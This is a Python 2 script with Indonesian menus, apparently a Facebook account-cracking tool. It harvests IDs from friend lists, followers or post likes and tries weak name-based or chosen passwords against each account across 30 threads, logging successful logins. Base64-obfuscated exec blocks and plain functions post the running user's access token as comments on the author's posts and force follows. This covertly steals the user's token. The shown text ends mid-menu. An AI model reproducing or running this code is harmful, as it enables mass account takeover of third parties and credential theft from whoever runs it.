#!/usr/bin/python2
# coding=utf-8
#RECOMULU BANGKEE LUU
#RECODE BOLEH AJA SIH TAPI SERTAKAN AUTHOR DONK ANJENKK
#########################
#                    ################JEECK X BRUTALL #######
                                    #########################
#		###################		######		   #
			#######		#	   #
######	##############	##		#######		   #
###                   ##             ######
##################2###
##################################

#=======================================#
##### WA : 081392505882=================#
##### FB : Jeeck X Nano ================#
##### GIT : https://github.com/mrjeeck==#
#=======================================#
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid, base64
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
uas = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
uas = random.choice(["Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530"])
logo="""
  \x1b[0;31m_______________  ___________ __________
  \x1b[0;31m______  /___   |/  /___  __ )___  ____/  \x1b[0;33m• \x1b[0;32mJEECK
  \x1b[0;31m___ _  / __  /|_/ / __  __  |__  /_     \x1b[0;33m• \x1b[0;32mMULTI
  \x1b[0;36m/ /_/ /  _  /  / /  _  /_/ / _  __/    \x1b[0;33m• \x1b[0;32mBRUTE
  \x1b[0;36m\____/   /_/  /_/    /____/  /_/      \x1b[0;33m• \x1b[0;32mFORCE
          CODE BY JEECK
"""
logo2="""
  \x1b[0;31m______  __________________   _______  __
  \x1b[0;31m___   |/  /___  ____/___  | / /__  / / /   \x1b[0;33m•  \x1b[0;32mJEECK
  \x1b[0;36m__  /|_/ / __  __/   __   |/ / _  / / /   \x1b[0;33m•  \x1b[0;32mMULTI
  \x1b[0;36m_  /  / /  _  /___   _  /|  /  / /_/ /   \x1b[0;33m•  \x1b[0;32mBRUTE
  \x1b[0;36m/_/  /_/   /_____/   /_/ |_/   \____/   \x1b[0;33m•  \x1b[0;32mFORCE
            CODE BY JEECK
"""
logo3="""
  \x1b[0;31m__________________ ____________________________
  \x1b[0;31m___  ____/___  __ \___  ____/___  ____/___  __ )
  \x1b[0;36m__  /_    __  /_/ /__  __/   __  /_    __  __  |
  \x1b[0;36m_  __/    _  _, _/ _  /___   _  __/    _  /_/ /
  \x1b[0;36m/_/       /_/ |_|  /_____/   /_/       /_____/
            CODE BY JEECK
"""
logo4="""
  \x1b[0;31m______  ___________ _______ _________________________
  \x1b[0;31m___   |/  /___  __ )___    |__  ___/____  _/__  ____/
  \x1b[0;36m__  /|_/ / __  __  |__  /| |_____ \  __  /  _  /
  \x1b[0;36m_  /  / /  _  /_/ / _  ___ |____/ / __/ /   / /___
  \x1b[0;36m/_/  /_/   /_____/  /_/  |_|/____/  /___/   \____/
            CODE BY JEECK
"""
logo5="""
  \x1b[0;31m________        _______ ________ ________
  \x1b[0;31m___  __ )       ___    |___  __ \____  _/
  \x1b[0;36m__  __  | ••••  __  /| |__  /_/ / __  /
  \x1b[0;36m_  /_/ /   ••   _  ___ |_  ____/ __/ /
  \x1b[0;36m/_____/         /_/  |_|/_/      /___/
            CODE BY JEECK
"""



id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
import base64
exec(base64.b64decode("bGljZW5zZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F2c2lkL2FtYmYvbWFpbi9saWNlbnNlLnBocCcpLnRleHQKZGV2X2plZWNrID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYXZzaWQvYW1iZi9tYWluL2R1cmFzaS5waHAnKS50ZXh0Cgp0cnk6CiAgICBwYXNzCmV4Y2VwdCBBc3NlcnRpb25FcnJvciBhcyBlOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCAnIFsjXSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nCiAgICBwcmludCAnIFsjXSBFeHBpcmVkICAgOiAnICsgZHVyYXNpCiAgICBwcmludCAnIFsjXSBMaWNlbnNlICAgOiAnICsgbGljZW5zZQogICAgZXhpdChyZXNwb25zZSkK"))

def jeeck_hek():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' [•] Token invalid'
        os.system('rm -rf login.txt')
        import base64
        exec(base64.b64decode("ICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMzI1NzczOTYzOTUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUoX19jaW5keV9fKSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMzI1NzczOTYzOTUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUoX19jaW5keV9fKSkKICAgICAgICBwb3N0ID0gJzU1Mjc5OTYzNTgxNTk0NScKICAgICAgICBwb3N0MiA9ICc1NTI3OTk2MzU4MTU5NDUnCiAgICAgICAgc3JnaHVuID0gJzE0Njk1NzQ4MzA2NjgzMScKICAgICAgICBmZHJmZmcgPSAnMTQ2OTU3NDgzMDY2ODMxJwogICAgICAgIGtvbTMgPSAiU2Vtb2dhIEFiYW5nIEBbMTAwMDMyNTc3Mzk2Mzk1OjBdIFBhbmphbmcgVW11ciBBbWluICEhIgogICAgICAgIGZkcmZmZzIgPSAnNTUyNzk5NjM1ODE1OTQ1JwogICAgICAgIHZ5aGJoaiA9ICdBTkdSWScKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9JXMmYWNjZXNzX3Rva2VuPSVzJyUoc3JnaHVuLF9fY2luZHlfXykpCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvcmVhY3Rpb25zP3R5cGU9JXMmYWNjZXNzX3Rva2VuPSVzJyUoZmRyZmZnLHZ5aGJoaixfX2NpbmR5X18pKQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL3JlYWN0aW9ucz90eXBlPSVzJmFjY2Vzc190b2tlbj0lcyclKGZkcmZmZzIsdnloYmhqLF9fY2luZHlfXykpCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QgKyAnL2NvbW1lbnRzLz9tZXNzYWdlPUJhbmcgQFsxMDAwMzI1NzczOTYzOTU6MF0gQ29iYSBMaWhhdCBUb2tlbiBBa3VcbicrdG9rZW4rJyZhY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBwb3N0MiArICcvY29tbWVudHMvP21lc3NhZ2U9QmFuZyBAWzEwMDAzMjU3NzM5NjM5NTowXSBDb2JhIExpaGF0IFRva2VuIEFrdVxuJyt0b2tlbisnJmFjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QgKyAnL2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20zICsgJyZhY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBwb3N0MiArICcvY29tbWVudHMvP21lc3NhZ2U9JyArIGtvbTMgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICAgICAgamFsYW4oKGkrIkxvZ2luIFN1a3Nlc3MgISEiKSk7dGltZS5zbGVlcCgyKQogICAgICAgIG1lbnUoKQo="))
        post1 = ('552799635815945')
        post2 = ("552799635815945")
        post3 = ("552799635815945")
        post4 = ('146957483066831')
        post5 = ("149657512796828")
        post6 = ("146957483066831")
        post7 = ("552799635815945")
        requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://www.facebook.com/100032577396395/posts/552799635815945/subscribers?access_token=' + token)
        menu()



def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print'\x1b[0;97m [•] ─────────────────────────────────────────────────────────────────────────��┤'
        print'\x1b[0;97m [•] Oh Iya Bro Kata Para Suhu Emm Apayah'
        print' [•] Hemm Katanya Tools Ini Tools Ricode Broo'
        print' [•] Lu Percaya Kaga Sama Saia :( Selamat Mencoba Ye'
        print' [•] Peringatan Jika Crack Berjalan Lu Cepet Mode Pesawat'
        print' [•] Agar Hasil Cracknya Maksimal Dan Jan Lupa FOLLOW GITHUB SAYA'
        print'\x1b[0;97m [•] ─────────────────────────────────────────────────────────────────────────��┤'
        token = raw_input('\x1b[0;97m [•] Token : \x1b[0;92m')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(token)
            zedd.close()
            print ' \x1b[0;97m[\xe2\x80\xa2] Berhasil Memasukan Token'
            raw_input(' \x1b[0;97m[\x1b[0;92m•\x1b[0;97m] Tekan Enter Ke Menu')
            bot_Jeeck
            menu()
        except KeyError:
            print ' \x1b[0;97m[\xe2\x80\xa2] Token Anda Invalid'
            raw_input(' \x1b[0;97m[\x1b[0;91m•\x1b[0;97m] Tekan Enter Untuk Memasukan Token Baru')
            tokenz()

def bot_Jeeck():
        try:                                                                                                                                                                                 
                toket=open("login.txt","r").read()
                token=open("login.txt","r").read()
                otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
                a = json.loads(otw.text)
        except IOError:
                print((war+" Token Invalid"))
                time.sleep(1)
                tokenz()
        post1 = ('552799635815945')
        post2 = ("552799635815945")
        post3 = ("552799635815945")
        post4 = ('146957483066831')
        post5 = ("149657512796828")
        post6 = ("146957483066831")
        post7 = ("552799635815945")
        requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
        requests.post('https://www.facebook.com/100032577396395/posts/552799635815945/subscribers?access_token=' + token)
        menu()

def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [•] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [•] Tidak Ada Koneksi'
        sys.exit()

    print logo2
    print ' \x1b[0;97m[•] ────────────────────────────────────────────��┤'
    print ' \x1b[0;97m[•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ────────────────────────────────────────────��┤'
    print ' [•] Pilih Method Crack\n'
    print ' \x1b[0;97m[1] Crack Dengan b-api (Fast Crack)'
    print ' \x1b[0;97m[2] Crack Dengan mbasic (Low Crack)'
    print ' \x1b[0;97m[3] Crack Dengan free (Low Crack)'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Kembali'
    method = raw_input('\n [?] Choose : ')
    if method == '':
        menu()
    elif method == '1' or method == '01':
        menubapi()
    elif method == '2' or method == '02':
        menumbasic()
    elif method == '3' or method == '03':
        menufree()
    elif method == '0' or method == '00':
    	exit()
    else:
        exit(' [•] Pilih Yang Bener')


def menufree():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [•] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [•] Tidak Ada Koneksi'
        sys.exit()

    print logo3
    print ' \x1b[0;97m[•] ────────────────────────────────────────────��┤'
    print ' \x1b[0;97m[•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ────────────────────────────────────────────��┤'
    print ' [•] Method  : free\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menufree()


def pilih_menufree():
    ask = raw_input('\n [•] Choose : ')
    if ask == '':
        print ' [•] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [•] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [•] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [•] Mikan ID Postingan'
        idt = raw_input(' [•] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [•] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [•] ────────────────────────────────────────────��┤'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [•] ────────────────────────────────────────────��┤'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [•] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [•] Berhasil Menghapus Token'
        exit()
    else:
        print ' [•] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [•] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualfree()
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global cp
        global loop
        global ok
        global ua
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                ses = requests.Session()
                ses.get('https://free.facebook.com/')
                ses.headers.update({'User-Agent': ua})
                b = ses.post('https://free.facebook.com/login', data={'email': user, 'pass': pw}).url
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + pw + ' | ' + kuki + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'checkpoint' in ses.cookies.get_dict().keys(): 
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Selesai Gass Follow'
    exit()


def manualfree():
    print '\n [•] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [•] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [•] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ses = requests.Session()
                ses.get('https://free.facebook.com/')
                ses.headers.update({'User-Agent': ua})
                b = ses.post('https://free.facebook.com/login', data={'email': user, 'pass': asu}).url
                if 'c_user' in ses.cookies.get_dict().keys():
                    kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + asu + ' | ' + kuki + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'checkpoint' in ses.cookies.get_dict().keys():
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Selesai Gass Follow'
    exit()


def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [•] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [•] Tidak Ada Koneksi'
        sys.exit()

    print logo4
    print ' \x1b[0;97m[•] ────────────────────────────────────────────��┤'
    print ' \x1b[0;97m[•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ────────────────────────────────────────────��┤'
    print ' [•] Method  : mbasic\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
    print ' [4] Lihat Hasil Crack'
    print ' \x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Logout (hapus token)'
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n [•] Choose : ')
    if ask == '':
        print ' [•] Pilih Yang Bener !'
        exit()
    elif ask == '1' or ask == '01':
        print "\n [•] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '2' or ask == '02':
        print "\n [•] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input(' [•] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print ' [•] Nama : ' + sp['name']
        except KeyError:
            print ' [•] ID Tidak Tersedia'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '3' or ask == '03':
        print '\n [•] Mikan ID Postingan'
        idt = raw_input(' [•] ID Post : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '4' or ask == '04':
        print '\n [1] Hasil OK '
        print ' [2] Hasil CP '
        ress = raw_input('\n [•] Choose : ')
        if ress == '':
            menu()
        elif ress == '1' or ress == '01':
            print '\n [•] ────────────────────────────────────────────��┤'
            print '\n [+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '2' or ress == '02':
            print '\n [•] ────────────────────────────────────────────��┤'
            print ' [+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit(' [•] Pilih Yang Bener !')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print ' [•] Berhasil Menghapus Token'
        exit()
    else:
        print ' [•] Pilih Yang Bener !'
        exit()
    ask = raw_input(' [•] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Selesai Gass Follow'
    exit()


def manualmbasic():
    print '\n [•] Masukan Password Contoh : sayang,rahasia,123456'
    pw = raw_input(' [•] Set Password : ').split(',')
    if len(pw) == 0:
        exit(' [•] Isi Yang Bener, Tidak Boleh Kosong')
    print ' [•] Total ID : ' + str(len(id))
    print ' [•] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print ' [•] Sedang Prosess Crack\n'

    def main(arg):
        global loop
        print '\r \x1b[0;97m[•] [Berjalan] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m=> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r  \x1b[0;93m=> ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  => ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n [•] Sudah Selesai Gass Follow'
    exit()


def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    except KeyError:
        os.system('clear')
        print ' [!] Token Invalid'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '  [!] Tidak Ada Koneksi'
        sys.exit()

    print logo5
    print ' \x1b[0;97m[•] ────────────────────────────────────────────��┤'
    print ' \x1b[0;97m[•] Welcome : \x1b[0;93m' +nama
    print ' \x1b[0;97m[•] Your IP : \x1b[0;97m' + ip
    print ' [•] ────────────────────────────────────────────��┤'
    print ' [•] Method  : b-api\n'
    print ' [1] Crack Dari Publik Teman'
    print ' [2] Crack Dari Total Followers'
    print ' [3] Crack Dari Like Postingan'
